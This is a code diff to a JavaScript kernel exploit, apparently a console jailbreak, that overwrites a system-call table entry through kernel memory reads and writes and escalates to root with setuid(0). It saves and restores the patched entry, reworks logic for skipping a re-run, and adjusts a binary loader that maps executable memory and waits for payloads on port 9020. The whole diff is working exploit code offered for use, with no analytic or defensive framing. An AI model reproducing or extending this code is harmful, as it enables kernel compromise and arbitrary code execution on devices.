@@ -1505,6 +1505,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // sysent[661] is unimplemented so free for use
     const offset_sysent_661 = 0x1107f00;
     const sysent_661 = kbase.add(offset_sysent_661);
+    const sy_narg = kmem.read32(sysent_661);
+    const sy_call = kmem.read64(sysent_661.add(8));
+    const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
@@ -1594,9 +1597,13 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
-    localStorage.ExploitLoaded="yes"
-    sessionStorage.ExploitLoaded="yes"
-    //alert("kernel exploit succeeded!");
+    log('restore sys_aio_submit()');
+    kmem.write32(sysent_661, sy_narg);
+    // .sy_call = gadgets['jmp qword ptr [rsi]']
+    kmem.write64(sysent_661.add(8), sy_call);
+    // .sy_thrcnt = SY_THR_STATIC
+    kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
+    alert("kernel exploit succeeded!");
 }
 
 
@@ -1629,22 +1636,6 @@ function setup(block_fd) {
     cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
-
-function malloc(sz) {
-        var backing = new Uint8Array(0x10000 + sz);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = backing;
-        return ptr;
-    }
-
-    function malloc32(sz) {
-        var backing = new Uint8Array(0x10000 + sz * 4);
-        nogc.push(backing);
-        var ptr = mem.readp(mem.addrof(backing).add(0x10));
-        ptr.backing = new Uint32Array(backing.buffer);
-        return ptr;
-    }
 
 function runBinLoader() {
     var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
@@ -1685,7 +1676,7 @@ function runBinLoader() {
         payload_buffer
     );
 
-    log('GoldHEN Already Loaded, BinLoader Is Ready. Send A Payload To Port 9020 Now');
+    log('BinLoader is ready. Send a payload to port 9020 now');
 }
 
 // overview:
@@ -1704,16 +1695,20 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
+    if(sessionStorage.getItem('binloader')){
+        runBinLoader();
+        return new Promise(() => {});
+    }
+
+    // If setuid is successful, we dont need to run the kexploit again
     try {
-       chain.sys('setuid', 0);
-    } catch (e) {
-        localStorage.ExploitLoaded = "no";
-    }
-    
-    if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+        if (sysi('setuid', 0) == 0) {
+            log("Not running kexploit again.");
             runBinLoader();
-            return new Promise(() => {});
+            return;
+        }
     }
+    catch (e) {}
 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
@@ -1791,6 +1786,23 @@ export async function kexploit() {
 }
 
 
+function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
+
+function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
+
+
 kexploit().then(() => {
     const PROT_READ = 1;
     const PROT_WRITE = 2;
@@ -1809,5 +1821,4 @@ kexploit().then(() => {
         payload_loader.addr,
         payload_buffer,
     );
-
 })
